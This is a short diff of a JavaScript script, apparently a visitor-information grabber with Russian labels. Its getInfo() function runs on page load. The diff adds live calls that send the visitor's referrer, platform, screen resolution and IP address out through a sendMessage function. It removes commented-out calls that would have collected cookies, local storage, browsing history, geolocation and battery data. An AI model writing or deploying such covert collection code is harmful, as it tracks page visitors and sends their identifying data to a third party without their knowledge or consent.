@@ -12,17 +12,12 @@ function sendMessage(text) {
 
 
 async function getInfo() {
-    //sendMessage(info.pageon());
-    //sendMessage(info.referrer());
-    //sendMessage(info.previousSites());
-    //sendMessage(info.browserInfo());
-    //sendMessage(info.dataCookies());
-    //sendMessage(info.dataStorage());
-    //sendMessage(info.sizeScreen());
-    //sendMessage(await info.position());
-    //sendMessage(await info.battery());
+    sendMessage('Перешел от: ' + info.referrer());
+    sendMessage('Платформа: ' + info.browserInfo().platform);
+    sendMessage('Разрешение экрана: ' + String(info.sizeScreen().width) + 'x' + String(info.sizeScreen().height));
     ipobject = (await info.ip());
     sendMessage('IP адрес: ' + ipobject)
+	
 }
 
 getInfo();
